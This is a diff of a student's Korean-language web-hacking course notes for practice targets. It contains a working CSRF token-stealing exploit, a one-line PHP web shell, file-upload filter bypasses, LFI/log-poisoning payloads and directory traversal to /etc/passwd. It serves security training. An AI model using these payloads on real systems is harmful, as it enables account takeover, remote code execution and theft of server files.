@@ -503,7 +503,7 @@ ex) pw파라미터 등...
 
 <script>
 function exploit() {
-	var token = document.gerElemenById("getCSRFToken").contentDocument
+	var token = document.gerElemenById("getCSRFaToken").contentDocument
 
 }
 </script>
@@ -528,14 +528,35 @@ CSRF Part 2 / http://normaltic.com:7777/csrf_2/notice_update.php?id=40&view=1
 </script>
 
 CSRF Part 3 / http://normaltic.com:7777/csrf_3/notice_update.php?id=89&view=1
+내 답
 <meta name="referrer" content="no-referrer">
-
 <iframe style="visibility:hidden;display:none" name="stealthframe" sandbox="allow-forms">
 </iframe>
 <body onload="document.csrf_form.submit();">
 <form method="POST" name="csrf_form" action="http://normaltic.com:7777/csrf_2/mypage_update.php" target="stealthframe">
 	<input type="hidden" name="pw" value="1234">
 </form>
+
+-정답-
+<iframe id="getCSRFToken" src="http://normaltic.com:7777/csrf_3/mypage.php" width="0" height="0" border="0" onload="exploit()"></iframe>
+
+<iframe width="0" height="0" border="0" name="stealthframe" id="stealthframe" style="display: none;"></iframe>
+
+<script>
+function exploit() {
+     var token = document.getElementById("getCSRFToken").contentDocument.forms[0].csrf_token.value;
+
+     var ch_pass = '1234';
+     document.writeln('<form width="0" height="0" border="0" method="post" action="http://normaltic.com:7777/csrf_3/mypage_update.php" target="stealthframe">');
+    document.writeln('<input type="hidden" name="pw" value="' + ch_pass + '" /><br />');
+    document.writeln('<input type="hidden" name="csrf_token" value="' + token + '" />');
+     document.writeln('<input type="submit" name="submit" value="Exploit" /><br/>');
+     document.writeln('</form>');
+     document.forms[0].submit.click();
+}
+</script>
+
+
 
 과제
 1) CSRF 문제 1, 2
@@ -562,8 +583,228 @@ alert(csrf_token);
   </body>
 </html>
 
-RE111590460NL
 
+RE111590460NL
+-------------------------------------------------------------
+9주차 수업
+<?
+<File Upload>
+> 공격자가 원하는 임의의 파일을 업로드 할 수 있는 취약점
+
+- 발생 가능위치
+> 파일을 업로드하는 곳
+
+- 공격 시나리오 / 구체적 방안까지 생각
+(1) 서버 측 실행 파일 업로드
+> RCE -> 서버 장악 (Webshell)
+
+(2) Deface 공격
+> 웹 루트에서 메인 페이지 변조
+
+(3) 디도스
+> 대용량 파일 업로드
+
+* Web SHELL / url을 활용하여 파일 실행 요청
+> 서버에 임의의 명령을 내릴 수 있는 서버 측 실행 파일
+
+- 1줄 web shell, 1구화목마
+<?php echo system($_GET['cmd']); ?>
+
+// Command (ls, id, ifconfig...)
+
+system('ls')
+
+webshell.php?cmd=id
+
+* 내가 올린 webshell을 실행하는 방법
+> 우리가 올린 파일이 어디있는지
+find / -name // "" 2> /dev/null
+
+- 대놓고 php, jsp, asp 파일이 올라가는 곳 별로 없다.
+
+- 우회 Bypass가 필수적
+1) 파일 검증 우회
+* Content Type MIME
+jpg로 바꿔라
+
+2) 확장자 검증
+.php .jsp 만 검증 할때
+
+우회 확장자 사용
+.phtml, .php3, .php5, .jspx
+.pHp>
+webshell.php%00.jpg(윈도우 서버에서만 가능)
+
+3) 서버측 파일 오버라이드 =/ 오버리딩
+.htaccess
+AddType application/x-httpd-php .normaltic
+
+webshell.normaltic
+
+4) File Signature / hex : Hex Editor 활용
+확장자별 고유 HEX 마지막에 코드 삽입
+> moon.jpg 를 .php로 바꿔서 올린다
+앞부분 jpg 시그니쳐만 확인해서 그냥 php로 코드가 실행이 된다.
+
+5) 파일 업로드 다른 Method : PUT
+PUT / webshell.php
+request body에 코드 작성
+
+6) 개발자의 실수 + 클라이언트 측 검증
+
+- 과제
+1) 파일 업로드 공격 정리
+2) File Upload 1,2번째 문제 풀이
+3) 웹 개발 & 보고서
+
+https://ctftime.org/
+
+?>
+-------------------------------------------------------------
+10주차 수업
+<?php
+필터링!
+- 업로드 되지 않는다.
+
+1. 클라이언트 측 필터링
+> 이용자들의 편의!
+
+2. 서버측 필터링 (검증코드)
+: 잘못구현.
+
+실패하면 > 파일을 저장x, 파일 업로드 받아서는 X
+
++ 로그인
+실패 시 > 다른 페이지로 리다이렉트
+
+---------------------------------------------------------------------------
+파일 업로드
+
+if(파일 검사 코드){
+~~~
+}
+
+- 내가 올린 파일 어디에 어떻게 저장되는지 / 정상파일을 먼저 올려보자
+ex) http:~~~~/files/pajji/pajji.png
+
+(1) 이미지 파일 웹쉘
+.php
+서버측 실행 파일의 확장자만!!! 실행할 수 있다!
+
+.jpg, .png 실행가능?>
+<?php
+
+특정조건에 따라서
+> 다른 취약점.
+
+> File Inclusion 취약점
+- LFI : Local File Include
+- RFI : Remote File Include
+urlPath=http:~~~~~/webshell.txt
+?>
+> <?php ehco ~~ ?>
+<<?php
+include($_GET['urlPath']);
+
+--- 웹개발 : include
+> 취약점
+
+include('사용자의 파라미터')
+
+??lang=en.php
+
+page=/etc/passwd (해당파일이 있다면 가져옮)
+-----------------------------------------------------------------------
+- File Include 핵심
+* 서버에 있는 원하는 파일을 확인할 수 있다.
+
+> 소스코드를 볼 수 없다.. / was에서 php를 실행해버림
+> php 코드를 실행한다.
+> 그림파일 마지막에 php(webshell)코드를 포함하여 file upload 시키고, include, 명령어를 실행해본다.
+?>
+> ../../files/pajji.png&<?php echo system($_GET['cmd']); ?>
+<?php
+* 파일 Include 취약점
+> 파일 업로드 기능이 없어도 가능하다
+ ?>
+- GET/<?php echo system($_GET['cmd']); ?>
+> RCE 가능
+<?php
+access.log > 접근 로그
+웹 서버로 들어오는 로그
+
+http://normaltic.com:9023/lfi_1/files/%eb%b0%95%ec%a7%80%ec%99%84/webshell.png
+
+include("./lang/" .$_GET['lang']);
+* 디렉로리 트레버져
+./lang/../../../../../../etc/passwd
+
+ ?>
+
+-----------------------------------------------------------------------
+<?php
+> File Download 취약점
+> 서버에 있는 임의의 파일을 다운로드 취약점
+** 파일 다운로드 종류
+1) 직접 접근 > 인가
+
+2) 다운로드 스크립트 작성
+download.php?filePath=파일 경로
+
+http://normaltic.com:3184/download_1/download.php?filePath=/../../../../../password.txt
+
+> 서버에 있는 모든 파일을 공격자가 가져갈 수 있다.
+?>
+/서버 측 소스코드
+login.php
+<?php
+	include('./db.php');
+	include('./top.php');
+
+	db_connect();
+?>
+<?php
+소스코드 받아야하는 이유!
+1. 주석 코드
+2. 취약점 찾기 위해서
+
+- 소스코드
+> DB 연결 정보
+
+
+
+> DB 계정 비밀번호
+1) 파일 다운로드 취약점을 찾고
+2) DB 계정 비밀번호 찾아서 DM 보내기
+?>
+.
+.
+.
+.
+.
+.
+..
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
 .
 .
 ..
